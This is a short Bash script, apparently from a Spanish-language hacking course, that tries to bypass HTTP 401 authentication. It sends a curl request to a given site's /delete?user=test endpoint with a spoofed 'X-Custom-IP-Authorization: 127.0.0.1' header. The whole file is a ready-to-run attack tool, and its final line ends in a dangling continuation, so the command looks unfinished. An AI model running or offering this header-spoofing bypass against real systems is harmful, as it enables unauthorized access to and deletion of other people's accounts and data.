#!/bin/bash
# hacking y seguridad 2022
# Bypass 401

echo "Uso.: ./bypass401.sh https://url"
curl -k -s -I -vvvv $1/delete?user=test -X GET \
-H "X-Custom-IP-Authorization: 127.0.0.1" \

